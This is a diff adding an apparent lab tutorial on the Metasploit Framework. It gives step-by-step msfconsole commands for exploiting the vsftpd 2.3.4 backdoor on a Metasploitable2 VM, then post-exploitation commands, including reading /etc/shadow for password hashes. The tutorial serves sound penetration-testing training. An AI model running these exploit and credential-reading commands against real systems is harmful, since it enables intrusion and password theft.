@@ -1,0 +1,61 @@
+Introduction to Metasploit Framework
+The Metasploit Framework is a powerful, open-source platform used by cybersecurity professionals for penetration testing, exploit development, and vulnerability research. It provides a massive database of known exploits, payloads, encoders, and post-exploitation tools, allowing Red Teamers to simulate real-world attacks against target networks.
+
+3. Prerequisites
+
+    Attacker Machine: Kali Linux VM
+
+    Target Machine: Metasploitable2 VM
+
+    Ensure both virtual machines are up and running and can communicate over the local network.
+
+4. Step-by-Step Exploitation Process
+
+Phase 1: Initialization and Setup
+
+    Open the Kali Linux terminal.
+
+    Note: If the Metasploit-framework is more than two weeks old, run the update command to get the latest framework modules:
+    sudo msfupdate (or sudo apt update && sudo apt install metasploit-framework on newer Kali builds).
+
+Phase 2: Launching Metasploit and Exploiting the Target
+Enter the following commands sequentially in the terminal to exploit a known vulnerability (e.g., the vsftpd 2.3.4 backdoor commonly found on Metasploitable2):
+
+    msfconsole (Launches the Metasploit Framework interactive shell).
+
+    search vsftpd (Searches the database for exploits related to the vulnerable FTP service).
+
+    use exploit/unix/ftp/vsftpd_234_backdoor (Selects the specific exploit module to use).
+
+    set RHOSTS <Target_IP> (Sets the target machine's IP address, e.g., 192.168.62.129).
+
+    show options (Verifies that all required parameters, like RHOSTS and Port, are set correctly).
+
+    exploit (Executes the attack against the target machine).
+
+    Result: It will successfully open a command shell directly into the target IP (Metasploitable2 VM).
+
+Phase 3: Post-Exploitation (Demonstrating Impact)
+Once the shell is established, execute the following commands to demonstrate file manipulation and data exfiltration:
+
+    Create a file with some contents:
+    echo "Red Team network compromise successful" > redteam_proof.txt
+
+    Copy the file to another new file:
+    cp redteam_proof.txt copied_proof.txt
+
+    Now go to the Metasploitable2 VM console directly (or use cat in the shell) and check the same file contents to verify they were created remotely:
+    cat copied_proof.txt
+
+    Demonstrate access to highly sensitive details (like password hashes):
+    cat /etc/shadow
+    (This proves that the exploit granted root-level privileges, allowing the attacker to access critical system files).
+
+5. Database Commands for Connection & Status
+Metasploit includes a built-in PostgreSQL database to track hosts, services, and vulnerabilities discovered during an assessment. These commands are used within the msf> prompt to interact with the connected database:
+
+    db_status: Checks the connection status to the current database (confirms if Metasploit is properly connected to PostgreSQL).
+
+    db_connect <username:password@host:port/database>: Manually connects to a specific database if the default connection is down.
+
+    db_disconnect: Disconnects from the current data service.
